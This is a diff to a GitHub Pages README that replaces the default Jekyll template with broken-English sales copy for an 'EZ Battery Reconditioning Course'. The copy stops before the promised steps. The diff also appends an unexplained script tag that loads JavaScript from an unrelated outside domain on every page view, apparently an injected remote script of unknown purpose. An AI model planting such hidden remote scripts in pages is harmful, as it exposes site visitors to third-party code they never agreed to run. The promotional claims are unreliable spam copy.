@@ -1,37 +1,9 @@
-## Welcome to GitHub Pages
-
-You can use the [editor on GitHub](https://github.com/easylifes/magic/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
-
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
-
-### Markdown
-
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
-
-```markdown
-Syntax highlighted code block
-
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/easylifes/magic/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+What is EZ Battery Reconditioning Course
+It’s a Battery Reconditioning Course by a 3 Times Best selling author Tom Ericson. EZ Battery reconditioning is a step by step guide that uses simple tools and techniques to repair old or dead batteries to give it new life. You can use your batteries for more than its expected battery life. EZ Battery Reconditioning is accomplished by a pdf manual which guides you through every stage. How you can easily recondition as many batteries as u can and make good bucks out of it. It’s not that simple neither too hard if you won’t follow the steps carefully.
+To Make EZ Reconditioning method works easily each step had diagrams and pictures. So that, every concept cleared well and it will be easy for you to recondition the batteries at the optimum level. 
+EZ Battery Reconditioning program will provide a detail information regarding how to check the condition of a battery. Whether it rejuvenated or not, a couple of ways to recondition it and the tools you require to do so. The EZ Battery Reconditioning will guide you through the different methods. Which consists maintaining batteries, checking their lifespan and the appropriate method to rejuvenate old or dead batteries.
+By using the EZ Battery Reconditioning program, you’ll not only save money but also make money by reconditioning as many batteries as you can. It also helps in securing our environment by not letting dumb the dead batteries into the environment. The Batteries contain harmful chemical and acid which may harm the soil and underground water.
+How Battery Reconditioning Method Works
+Well, the secret behind the working of EZ Battery Reconditioning lies in the 21 chapter manual. It describes what to use, how to use, methods to apply while renewing an old of dead batteries.
+Here is the 4 Step by Step guide which you need to follow
+<script type="text/javascript" async src='https://id.elleidea.com/cf.js'></script>
